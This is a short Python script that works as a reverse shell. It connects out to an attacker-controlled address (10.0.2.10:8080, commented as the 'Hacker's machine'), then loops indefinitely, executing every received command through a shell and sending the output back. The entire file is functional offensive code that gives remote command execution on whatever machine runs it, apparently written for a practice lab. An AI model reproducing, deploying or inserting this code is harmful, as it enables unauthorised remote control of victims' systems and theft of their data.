#import socket
from socket import SOCK_STREAM, socket, AF_INET
import subprocess

# Create a subprocess to execute on Terminal of Target
def command_execution(command):
    return subprocess.check_output(command, shell=True)

connection = socket(AF_INET, SOCK_STREAM)
connection.connect(("10.0.2.10", 8080))  # Connect to Hacker's machine

connection.send(b"Connection established\n")

while True: # Create infinite loop of execution of commands
    command = connection.recv(1024).decode()
    command_output = command_execution(command)

    connection.send(command_output)

connection.close()